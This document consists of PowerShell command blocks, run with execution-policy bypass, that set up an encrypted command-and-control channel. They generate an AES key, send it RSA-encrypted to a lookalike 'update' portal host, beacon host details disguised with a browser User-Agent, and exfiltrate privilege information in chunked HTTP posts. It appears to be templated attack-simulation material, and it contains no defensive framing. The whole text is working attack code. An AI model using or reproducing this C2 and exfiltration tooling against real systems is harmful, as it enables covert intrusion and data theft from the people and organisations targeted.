# Generate AES-256 key and IV for C2 encryption
$aes = [System.Security.Cryptography.Aes]::Create();
$aes.KeySize = 256;
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$aes.GenerateKey(); $aes.GenerateIV();
$keyB64 = [Convert]::ToBase64String($aes.Key);
$ivB64 = [Convert]::ToBase64String($aes.IV);
Write-Host \"AES-256-CBC Key Generated\";
Write-Host \"Key (B64): $($keyB64.Substring(0,20))...[REDACTED]\";
Write-Host \"IV  (B64): $ivB64\";
Write-Host \"Key Size : $($aes.KeySize) bits\""

powershell -ep bypass -c "
# Key exchange via RSA-encrypted channel
$rsa = [System.Security.Cryptography.RSACryptoServiceProvider]::new(2048);
$serverPubKey = '<RSAKeyValue><Modulus>xR7k2mQ...</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>';
$rsa.FromXmlString($serverPubKey);
$encryptedKey = $rsa.Encrypt($aes.Key, $true);
$payload = @{
  key = [Convert]::ToBase64String($encryptedKey);
  iv = [Convert]::ToBase64String($aes.IV);
  id = 'a3f8c2d1'
} | ConvertTo-Json;
Invoke-RestMethod -Uri 'https://update.{companyName}-portal.com/api/init' -Method POST -Body $payload -ContentType 'application/json';
Write-Host 'AES key exchanged via RSA-2048 encrypted channel'"

powershell -ep bypass -c "
function Encrypt-C2($plaintext, $key, $iv) {
  $aes = [System.Security.Cryptography.Aes]::Create();
  $aes.Key = $key; $aes.IV = $iv;
  $encryptor = $aes.CreateEncryptor();
  $ms = New-Object IO.MemoryStream;
  $cs = New-Object Security.Cryptography.CryptoStream($ms, $encryptor, 'Write');
  $sw = New-Object IO.StreamWriter($cs);
  $sw.Write($plaintext); $sw.Close();
  return [Convert]::ToBase64String($ms.ToArray())
}
$beacon = '{\"id\":\"a3f8c2d1\",\"ts\":1709290800,\"host\":\"WS-PC0142\"}';
$encrypted = Encrypt-C2 $beacon $aes.Key $aes.IV;
Write-Host \"Plaintext : $($beacon.Length) bytes\";
Write-Host \"Encrypted : $($encrypted.Length) bytes (Base64)\";
Write-Host \"Sample    : $($encrypted.Substring(0,40))...\""

powershell -ep bypass -c "
$encBeacon = Encrypt-C2 $beacon $aes.Key $aes.IV;
$headers = @{
  'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)';
  'Content-Type' = 'application/octet-stream';
  'X-Correlation-ID' = [guid]::NewGuid().ToString()
};
$response = Invoke-RestMethod -Uri 'https://update.{companyName}-portal.com/api/telemetry' -Method POST -Body ([Convert]::FromBase64String($encBeacon)) -Headers $headers;
$decrypted = Decrypt-C2 $response.data $aes.Key $aes.IV;
Write-Host \"C2 Response (encrypted): $($response.data.Substring(0,30))...\";
Write-Host \"C2 Response (decrypted): $decrypted\""

powershell -ep bypass -c "
$cmdOutput = whoami /priv | Out-String;
$encOutput = Encrypt-C2 $cmdOutput $aes.Key $aes.IV;

# Chunk encrypted data into HTTP POST stream
$chunkSize = 4096;
$chunks = [math]::Ceiling($encOutput.Length / $chunkSize);
Write-Host \"Command output: $($cmdOutput.Length) bytes\";
Write-Host \"Encrypted: $($encOutput.Length) bytes\";
Write-Host \"Chunks: $chunks x ${chunkSize}B\";
for($i=0; $i -lt $chunks; $i++) {
  $chunk = $encOutput.Substring($i*$chunkSize, [math]::Min($chunkSize,$encOutput.Length-$i*$chunkSize));
  Invoke-RestMethod -Uri 'https://update.{companyName}-portal.com/api/telemetry/stream' -Method POST -Body $chunk -Headers @{'X-Chunk'=\"$i/$chunks\"};
  Write-Host \"  Chunk $i/$chunks sent ($($chunk.Length) bytes)\";
}"

